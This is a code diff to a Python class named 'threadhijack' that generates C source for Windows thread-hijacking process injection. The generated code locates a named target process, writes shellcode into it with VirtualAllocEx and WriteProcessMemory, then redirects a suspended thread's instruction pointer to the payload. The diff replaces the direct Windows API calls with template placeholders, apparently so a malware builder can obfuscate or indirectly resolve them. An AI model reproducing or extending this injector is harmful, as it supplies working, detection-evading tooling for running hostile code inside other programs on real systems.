@@ -13,8 +13,7 @@ class threadhijack:
     def imports(self) -> list[str]:
         return ["#include <windows.h>", 
                 "#include <stdio.h>", 
-                "#include <stdlib.h>", 
-                "#include <winternl.h>", 
+                '#include "spawnandinject.h"',
                 "#include <tlhelp32.h>"]
 
     def compilerOptions(self) -> list[str]:
@@ -33,19 +32,19 @@ class threadhijack:
     HANDLE hProcSnap;
     PROCESSENTRY32 pe32;
 
-    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    hProcSnap = {CreateToolhelp32Snapshot}(TH32CS_SNAPPROCESS, 0);
     if (INVALID_HANDLE_VALUE == hProcSnap)
         return 0;
 
     pe32.dwSize = sizeof(PROCESSENTRY32);
 
-    if (!Process32First(hProcSnap, &pe32))
+    if (!{Process32First}(hProcSnap, &pe32))
     {{
-        CloseHandle(hProcSnap);
+        {CloseHandle}(hProcSnap);
         return 0;
     }}
 
-    while (Process32Next(hProcSnap, &pe32))
+    while ({Process32Next}(hProcSnap, &pe32))
     {{
         if (lstrcmpiA("$target", pe32.szExeFile) == 0)
         {{
@@ -54,9 +53,9 @@ class threadhijack:
         }}
     }}
 
-    CloseHandle(hProcSnap);
+    {CloseHandle}(hProcSnap);
 
-    hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
+    hProc = {OpenProcess}(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                                 PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
                             FALSE, (DWORD)pid);
 
@@ -69,9 +68,9 @@ class threadhijack:
     THREADENTRY32 thEntry;
 
     thEntry.dwSize = sizeof(thEntry);
-    HANDLE Snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    HANDLE Snap = {CreateToolhelp32Snapshot}(TH32CS_SNAPTHREAD, 0);
 
-    while (Thread32Next(Snap, &thEntry))
+    while ({Thread32Next}(Snap, &thEntry))
     {{
         if (thEntry.th32OwnerProcessID == pid)
         {{
@@ -82,21 +81,17 @@ class threadhijack:
     CloseHandle(Snap);
 
     // perform payload injection
-    pRemoteCode = VirtualAllocEx(hProc, NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, $memoryPermission);
-    WriteProcessMemory(hProc, pRemoteCode, (PVOID)shellcode, (SIZE_T){shellcodeSize}, (SIZE_T *)NULL);
+    pRemoteCode = {VirtualAllocEx}(hProc, NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, $memoryPermission);
+    {WriteProcessMemory}(hProc, pRemoteCode, (PVOID)shellcode, (SIZE_T){shellcodeSize}, (SIZE_T *)NULL);
 
     // execute the payload by hijacking a thread in target process
-    SuspendThread(hThread);
+    {SuspendThread}(hThread);
     ctx.ContextFlags = CONTEXT_FULL;
-    GetThreadContext(hThread, &ctx);
-#ifdef _M_IX86
-    ctx.Eip = (DWORD_PTR)pRemoteCode;
-#else
+    {GetThreadContext}(hThread, &ctx);
     ctx.Rip = (DWORD_PTR)pRemoteCode;
-#endif
-    SetThreadContext(hThread, &ctx);
+    {SetThreadContext}(hThread, &ctx);
 
-    ResumeThread(hThread);
+    {ResumeThread}(hThread);
     
-    CloseHandle(hProc);
+    {CloseHandle}(hProc);
 """).substitute(target=self.target, memoryPermission=self.memoryPermission)
